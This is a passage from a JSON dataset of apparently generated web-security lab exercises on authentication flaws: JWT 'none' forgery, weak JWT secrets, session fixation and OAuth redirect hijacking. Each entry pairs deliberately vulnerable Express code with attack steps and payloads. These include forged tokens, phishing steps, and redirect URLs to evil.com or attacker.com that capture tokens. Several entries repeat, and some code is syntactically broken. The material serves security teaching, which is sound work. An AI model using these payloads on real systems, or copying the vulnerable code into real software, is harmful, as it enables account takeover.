      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
      "payloads": [
        "Set-Cookie: session=12345; path=/",
        "https://target-site.com/login?session=12345",
        "POST /login HTTP/1.1 with Cookie: session=12345"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass in authorization header",
      "Lab Description": "The application uses JWTs for user authentication but fails to validate the signing algorithm securely. It accepts tokens signed using the 'none' algorithm without verifying the signature. The application trusts any decoded payload blindly. To solve: craft a forged JWT that impersonates the admin user.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite or Postman to capture a request with an Authorization: Bearer <token> header.",
        "2. Decode the JWT using jwt.io and note the algorithm used (likely HS256).",
        "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"user\":\"admin\"}.",
        "4. Remove the signature part of the JWT and send the modified token in the Authorization header.",
        "5. Send a GET request to /admin and verify access is granted."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers.authorization; if (authHeader) { const token = authHeader.split(' ')[1]; try { const user = jwt.decode(token); req.user = user; } catch (e) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "Authorization: Bearer [spoofed_token]",
        "{\"alg\":\"none\"} + {\"user\":\"admin\"}"
      ]
    },
    {
      "Lab scenario": "OAuth token leakage in redirect URI handler",
      "Lab Description": "This application uses OAuth for authentication, but its redirect URI handler is improperly configured and does not validate the 'state' parameter. An attacker can perform an open redirect and intercept the access token. To solve: steal the OAuth token issued to Carlos and log in as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Register a malicious redirect URI on a phishing domain that you control.",
        "2. Craft an OAuth login link using the original client_id but with your redirect_uri and omit or manipulate the state parameter.",
        "3. Send the crafted link to the victim via email or chat.",
        "4. Once the victim logs in and consents, their token is leaked to your server through the redirect.",
        "5. Use the stolen token in a request to /profile and confirm access to Carlos’s data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'client123'; const REDIRECT_URI = 'http://localhost:4000/oauth/callback'; app.get('/login', (req, res) => { const authURL = `http://authserver.com/auth?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`; res.redirect(authURL); }); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; req.session = { token: accessToken }; res.send('Logged in'); }); app.get('/profile', (req, res) => { if (!req.session || !req.session.token) return res.status(403).send('Unauthorized'); request.get({ url: 'http://resource-server.com/userinfo', headers: { Authorization: `Bearer ${req.session.token}` } }, (err, resp, body) => { res.send(body); }); }); app.listen(4000);",
      "payloads": [
        "http://authserver.com/auth?client_id=client123&redirect_uri=https://evil.com/callback&response_type=token",
        "https://evil.com/callback#access_token=eyFakeToken123",
        "Authorization: Bearer eyFakeToken123"
      ]
    },
    {
      "Lab scenario": "JWT signature spoof via algorithm confusion in login API",
      "Lab Description": "The login endpoint accepts JWTs for authentication. The backend library fails to properly validate the 'alg' field, allowing an attacker to switch from a signed algorithm (e.g. HS256) to 'none'. The application trusts the JWT's payload without verifying its authenticity. To solve: Forge a JWT for user 'carlos' using the 'none' algorithm and access the My account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept the login request using Burp Suite and capture the JWT from a valid login session.",
        "Send the token to Burp Decoder and decode the JWT structure to review its algorithm and payload.",
        "Manually change the algorithm from HS256 to none and set the payload to {\"username\":\"carlos\"}.",
        "Remove the JWT signature part entirely (keep only header and payload) and use the modified token in the Authorization header.",
        "Send a GET request to /my-account with the forged token and confirm unauthorized access to Carlos’s account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); res.send(`Account details for ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session tokens in login redirect",
      "Lab Description": "The application initializes session tokens before login and fails to regenerate them after successful authentication. The token remains fixed across the login flow. To solve: Set a known session ID before login, then force a victim (Carlos) to authenticate, hijack their session, and access the My account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie header value (session ID).",
        "Force this session ID using a crafted request or embed it in a link shared with Carlos (e.g., via email phishing).",
        "Wait for Carlos to authenticate using the fixed session ID, thus binding it to his session.",
        "Replay a request to /my-account using the hijacked session cookie.",
        "Verify successful unauthorized access to Carlos’s page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substr(2); sessions[sid] = { loggedIn: false }; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(403).send('Not logged in'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Set-Cookie: sid=attackersession",
        "GET /login HTTP/1.1 with sid=attackersession",
        "GET /my-account HTTP/1.1 with sid=attackersession (after Carlos login)"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leaks authorization code via Referer",
      "Lab Description": "The OAuth implementation leaks sensitive tokens through HTTP Referer headers. The app includes a third-party analytics script which causes unintentional leakage. To solve: Intercept the OAuth flow and extract Carlos’s authorization code from the Referer header when redirected to a malicious domain.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in to your account and observe the OAuth redirect flow with tools like Burp Suite or OWASP ZAP.",
        "Inject a malicious redirect_uri during the OAuth initiation phase pointing to your server.",
        "Send Carlos a crafted link to initiate OAuth with redirect_uri set to your controlled server.",
        "When Carlos logs in and authorizes the app, capture the HTTP Referer on your server, containing the authorization code.",
        "Exchange the code at the token endpoint to obtain access to Carlos’s protected resource and retrieve /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = authCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); tokens[token] = user; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`Account data for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running'));",
      "payloads": [
        "https://vulnerable.com/oauth/authorize?redirect_uri=https://attacker.com&client_id=abc",
        "Referer: https://attacker.com?code=stolen-code",
        "POST /token with code=stolen-code",
        "Authorization: Bearer <access_token>"
      ]
    },
    {
      "Lab scenario": "JWT secret key vulnerability in API authentication",
      "Lab Description": "The application's REST API uses JWTs for user authentication but fails to validate tokens securely. It uses a weak, guessable HMAC secret. The application trusts tokens even when re-signed with an attacker-supplied secret. To solve: Forge a valid admin JWT and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a valid JWT after logging in as a normal user",
        "Verify JWT algorithm using jwt.io and identify usage of 'HS256' with weak signature",
        "Attempt to brute-force the secret key using 'jwt-cracker' or 'jwt_tool'",
        "Forge a new JWT with payload {\"role\": \"admin\"} signed with the discovered key",
        "Use Postman to send a GET /admin request with the forged JWT in Authorization header"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = '123456'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { return res.send('Welcome admin!'); } else { return res.status(403).send('Not authorized'); } } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Auth Lab running'));",
      "payloads": [
        "header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, payload: { \"user\": \"carlos\", \"role\": \"admin\" }, secret: '123456'",
        "Authorization: Bearer <forged_JWT_token_with_admin_role>"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "The application does not issue a new session ID upon successful login, allowing session fixation attacks. Attackers can pre-set session tokens and force victims to authenticate using them. To solve: Fixate a session for Carlos, then access his My account page while impersonating him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to generate a session token by visiting the login page",
        "Send a crafted phishing link to Carlos embedding your session ID in the cookie",
        "Wait for Carlos to authenticate using the fixated session ID",
        "Reuse the same session ID to access GET /my-account endpoint",
        "Verify Carlos's account data and capture the response"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'swordfish' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Sensitive data for Carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Set-Cookie: sessionID=attackerSessionID",
        "Session fixation via phishing: http://victim.site/login with pre-set sessionID",
        "Reuse sessionID after victim login to access /my-account"
      ]
    },
    {
      "Lab scenario": "OAuth redirect manipulation in third-party login",
      "Lab Description": "The application uses OAuth for third-party authentication but fails to validate redirect URIs properly. This allows attackers to manipulate the flow and steal authorization codes. To solve: Hijack the OAuth code and log in as Carlos by exchanging the stolen token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to inspect the OAuth redirect URL during normal login",
        "Observe that redirect_uri is not validated server-side",
        "Modify redirect_uri to point to attacker-controlled server",
        "Wait for Carlos to initiate login and intercept the authorization code",
        "Exchange the code using curl or Postman to obtain Carlos’s access token"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.example.com/token', { form: { code, redirect_uri, client_id: 'abc', client_secret: 'xyz', grant_type: 'authorization_code' } }, (err, _, body) => { const token = JSON.parse(body).access_token; if (token) res.send('Logged in as: ' + token); else res.send('Auth failed'); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
      "payloads": [
        "redirect_uri=https://attacker.com/capture",
        "POST https://oauth.example.com/token with intercepted code and attacker redirect_uri",
        "Access-token: Bearer <token-for-carlos>"
      ]
    },
    {
      "Lab scenario": "JWT signature spoof via algorithm confusion",
      "Lab Description": "The application's authentication mechanism uses JWTs for session management. The backend accepts JWTs with the 'alg' header set to 'none', allowing attackers to forge tokens without a signature. The application trusts the contents of the JWT without verifying its signature when 'none' is used. To solve: Forge a JWT to impersonate Carlos and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture a request with a valid JWT after logging in.",
        "Send the token to Repeater and decode it using jwt.io or any JWT tool.",
        "Replace the 'alg' field in the header with 'none', and manually remove the signature.",
        "Change the payload to {\"username\":\"carlos\"} and re-encode the token.",
        "Set the modified token in the Authorization header and send the request to /my-account to confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\":\"none\"}.{\"username\":\"carlos\"}."
      ]
    },
    {
      "Lab scenario": "Session fixation through predictable session ID",
      "Lab Description": "The login endpoint allows the attacker to specify a session ID in a cookie before logging in. The server reuses this session ID after authentication without regenerating it. This allows session fixation attacks. To solve: Set a session ID before Carlos logs in, then hijack his session using the fixed session token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a GET request to /login with a crafted session ID cookie using Postman or Burp Repeater.",
        "Forward the session cookie to Carlos via phishing or social engineering simulation.",
        "Wait for Carlos to log in using the fixed session ID.",
        "Use Burp to resend a request with the same session ID and access /my-account.",
        "Verify access to Carlos’s account page using the hijacked session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "Cookie: session=attackersession123",
        "Set session=attackersession123 before victim login",
        "Access /my-account with same cookie after victim logs in"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect exploit",
      "Lab Description": "The application integrates OAuth for user login using a third-party provider. However, the OAuth flow includes an open redirect flaw that allows attackers to hijack authorization codes. The redirect_uri parameter is not properly validated, enabling token leakage. To solve: Hijack Carlos's OAuth login to obtain a valid access token and log in as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start OAuth flow and intercept the request to the authorization endpoint using Burp.",
        "Modify the redirect_uri to a controlled domain that reflects query parameters (e.g., http://evil.com/callback).",
        "Send a phishing link to Carlos with the crafted redirect_uri.",
        "Capture the leaked authorization code on the attacker's server.",
        "Exchange the stolen code at the token endpoint and use the access_token to call /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.provider.com/token', { form: { code, redirect_uri, client_id: 'client123', client_secret: 'secret456', grant_type: 'authorization_code' }}, (err, r, body) => { const token = JSON.parse(body).access_token; if (token) res.redirect(`${redirect_uri}?access_token=${token}`); else res.status(401).send('Token exchange failed'); }); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'token-for-carlos') res.send('Carlos OAuth account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "https://vulnerable.com/auth/callback?redirect_uri=http://evil.com/callback",
        "Intercepted code=abc123 from evil.com/callback?code=abc123",
        "POST to token endpoint with stolen code",
        "access_token=token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "The session management system issues session IDs before user authentication, but fails to rotate them upon successful login. This opens the door to session fixation attacks. The application allows setting the session cookie manually and does not regenerate a new session ID post-login. To solve: fixate a session for Carlos before he logs in, then hijack it to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept a GET request to /login page and observe the Set-Cookie header with session ID.",
        "Send the session ID to Burp Repeater and preserve it manually.",
        "Initiate login as 'carlos' using a separate browser or Postman while forcing the reused session cookie.",
        "Confirm that session ID was not regenerated after login by observing session cookie value post-authentication.",
        "Replay a GET /account request using the fixed session ID to gain access to Carlos’s account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]?.user; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
      "payloads": [
        "Inject known session ID via Cookie header: Cookie: session=fixedid123",
        "Login as Carlos in another tab using fixedid123",
        "Reuse fixedid123 to access /account as Carlos"
      ]
    },
    {
      "Lab scenario": "JWT token algorithm manipulation",
      "Lab Description": "This lab uses JWTs for user sessions but fails to properly validate the signing algorithm. The application uses a 'none' algorithm without enforcing server-side signature verification. To solve: forge a valid JWT with 'alg' set to 'none' and impersonate the admin user to access their account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman or Burp to capture the JWT token after logging in as a low-privilege user.",
        "Decode the token using jwt.io and note the structure and claims.",
        "Craft a new token manually with 'alg' set to 'none' and payload: { \"username\": \"admin\" }.",
        "Remove the signature section and send the token in the Authorization header.",
        "Send GET /admin-account with forged JWT and verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }, { username: 'user', password: 'userpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'none' }); res.json({ token }); } else { res.status(403).json({ message: 'Invalid credentials' }); } }); app.get('/admin-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded?.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(401).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "JWT with alg: 'none' and payload: { \"username\": \"admin\" }",
        "Base64 encoded header: eyJhbGciOiJub25lIn0=",
        "Base64 encoded payload: eyJ1c2VybmFtZSI6ImFkbWluIn0=",
        "JWT: eyJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect flow",
      "Lab Description": "This OAuth implementation allows redirection to arbitrary URLs after authentication due to missing state parameter validation. The 'redirect_uri' can be manipulated, enabling token theft via phishing. To solve: craft a malicious OAuth URL to intercept Carlos's token and use it to access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start Burp and intercept a login request using OAuth to identify the authorization flow URL and parameters.",
        "Modify the 'redirect_uri' parameter to point to your controlled server (e.g., http://attacker.net/callback).",
        "Send the modified URL to the victim or simulate a redirect using curl/Postman.",
        "Capture the redirected URL with the access token in your server logs.",
        "Use the stolen token in an Authorization header to access /user-profile as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const request = require('request'); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/user-profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') { res.send('Profile of Carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
      "payloads": [
        "GET /auth?redirect_uri=http://attacker.net/callback",
        "Intercepted access_token from attacker.net/callback",
        "Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT signature spoof via 'none' algorithm",
      "Lab Description": "This lab implements JSON Web Token (JWT) based authentication using insecure algorithm handling. The server accepts tokens signed using the 'none' algorithm, allowing attackers to forge valid tokens without knowing the secret key. The application verifies the JWT token from the Authorization header and grants access to sensitive resources without verifying the signature when 'alg' is set to 'none'. To solve: Craft a forged JWT for Carlos's account and access his profile page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a request using Burp Suite and inspect the Authorization: Bearer <token> header.",
        "Decode the JWT using jwt.io or Burp Decoder and verify the structure and algorithm.",
        "Create a new JWT header with \"alg\":\"none\" and set the payload to {\"username\":\"carlos\"}. Remove the signature part.",
        "Replace the original token in the Authorization header with the unsigned token and forward the request.",
        "Verify access to Carlos's profile page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Sensitive profile data for carlos'); } jwt.verify(token, 'supersecret'); res.send('Valid token'); } catch (err) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:${PORT}));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "This lab is vulnerable to session fixation due to predictable session ID issuance. The application assigns session IDs before login and does not regenerate them after successful authentication. The attacker can pre-define a session ID and trick the victim into using it. To solve: Fix a session ID before Carlos logs in and use it to hijack his session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept a request and note the Set-Cookie: session=... value before login.",
        "Send a crafted link to Carlos that contains a known session ID as a cookie value.",
        "Wait until Carlos logs in and reuses the known session ID.",
        "Send a GET /my-account request using the same session ID as the cookie.",
        "Confirm that Carlos’s account page is returned."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { const sessionId = req.cookies.session; sessions[sessionId] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const user = sessions[sessionId]; if (user === 'carlos') { res.send('Welcome to carlos's account'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
      "payloads": [
        "Cookie: session=known-session-id",
        "GET /login?username=carlos&password=securepass HTTP/1.1",
        "GET /my-account HTTP/1.1 with Cookie: session=known-session-id"
      ]
    },
    {
      "Lab scenario": "OAuth authorization code reuse",
      "Lab Description": "This lab’s OAuth implementation allows reuse of authorization codes, violating the single-use principle. An attacker who intercepts an unused authorization code can reuse it to log in as the victim. The app fails to invalidate codes after the first use. To solve: Capture Carlos's OAuth code and reuse it to gain access to his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp to proxy the OAuth flow and intercept the GET /oauth-callback?code=... request from Carlos.",
        "Save the captured code and allow Carlos’s original request to proceed.",
        "Send a new GET /oauth-callback?code=... request manually using the same code.",
        "Observe that a session is created and the user is authenticated as Carlos.",
        "Navigate to /my-account to verify the hijacked session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const usedCodes = {}; const users = { 'authcode-carlos': 'carlos' }; app.get('/oauth-callback', (req, res) => { const { code } = req.query; if (usedCodes[code]) { return res.status(403).send('Code already used'); } const user = users[code]; if (user) { usedCodes[code] = true; res.cookie('session', user); res.send('Logged in as ' + user); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(OAuth Code Reuse Lab running on http://localhost:${PORT}));",
      "payloads": [
        "GET /oauth-callback?code=authcode-carlos HTTP/1.1",
        "Cookie: session=carlos",
        "GET /my-account HTTP/1.1"
      ]
    },
    {
      "Lab scenario": "JWT tampering with none algorithm",
      "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it accepts tokens signed using the 'none' algorithm without verification. The application decodes the token and grants access based on the embedded user role. To solve: Forge a JWT granting admin privileges and access the /admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept JWT after login using Burp Suite and decode it using jwt.io.",
        "Observe the algorithm is set to 'HS256'. Change it to 'none' and remove the signature.",
        "Modify the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
        "Encode the modified header and payload without a signature.",
        "Use Postman to send a request with the tampered JWT in the Authorization header and verify access to /admin."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
        "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
        "Authorization: Bearer <modified_jwt>"
      ]
    },
    {
      "Lab scenario": "Session fixation through predictable session ID",
      "Lab Description": "The application sets session identifiers in the URL as query parameters after login. These session IDs are generated using predictable patterns. An attacker can fix a session ID for the victim and hijack the session post-login. To solve: Pre-set Carlos's session ID, trick him into logging in, then reuse the session to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to crawl and identify that sessionID is passed in the URL (e.g., /dashboard?sessionID=12345).",
        "Send a crafted link with sessionID=abc123 to Carlos via social engineering.",
        "Once Carlos logs in, his session is bound to sessionID=abc123.",
        "Use the same session ID to access /dashboard?sessionID=abc123 from your browser.",
        "Confirm account access and view Carlos’s dashboard page."
      ],
      "Vulnerability name": "Authentication",
